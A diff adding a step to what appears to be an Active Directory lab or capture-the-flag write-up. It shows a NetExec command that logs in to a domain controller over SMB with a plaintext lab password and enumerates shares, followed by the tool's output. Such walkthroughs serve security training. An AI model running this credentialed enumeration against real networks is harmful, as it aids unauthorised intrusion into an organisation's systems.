@@ -277,6 +277,23 @@ SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowsk
 ```
 Both users are compromised here!
 
+Both users have the same access on SMB 
+
+```python
+nxc smb dc.novacart.local -u 'j.paul' -p 'password123' --shares
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
+SMB         10.0.18.23      445    DC               [*] Enumerated shares
+SMB         10.0.18.23      445    DC               Share           Permissions     Remark
+SMB         10.0.18.23      445    DC               -----           -----------     ------
+SMB         10.0.18.23      445    DC               ADMIN$                          Remote Admin
+SMB         10.0.18.23      445    DC               C$                              Default share
+SMB         10.0.18.23      445    DC               IPC$            READ            Remote IPC
+SMB         10.0.18.23      445    DC               NETLOGON        READ            Logon server share 
+SMB         10.0.18.23      445    DC               Shares          READ            
+SMB         10.0.18.23      445    DC               SYSVOL          READ            Logon server share
+```
+
 
 
 
